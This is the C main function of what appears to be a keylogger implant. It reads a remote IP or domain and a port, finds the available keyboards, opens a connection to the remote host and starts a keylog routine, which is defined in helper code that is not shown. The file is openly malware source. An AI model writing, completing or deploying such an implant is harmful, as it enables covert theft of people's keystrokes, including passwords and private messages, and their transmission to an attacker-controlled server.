

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "implant.h"


int main(int ac, char **av) {

    implant_t instance = {
        .ip = {0},
        .port = 80, /* ip can be a domain name */
    };

    if (ERROR == parse_user_input(ac, av, &instance))
        return 1;

#ifdef DEBUG
    DEBUG_LOG(
        "[*] Implant settings:\n\tIP:%s\n\tPort:%d",
        instance.ip, instance.port
    );
#endif

    fetch_available_keyboards(&instance);

    int sockfd = init_remote_connection(&instance);
    if (sockfd < 0)
        return 1;

    keylog(&instance);
    return 0;
}
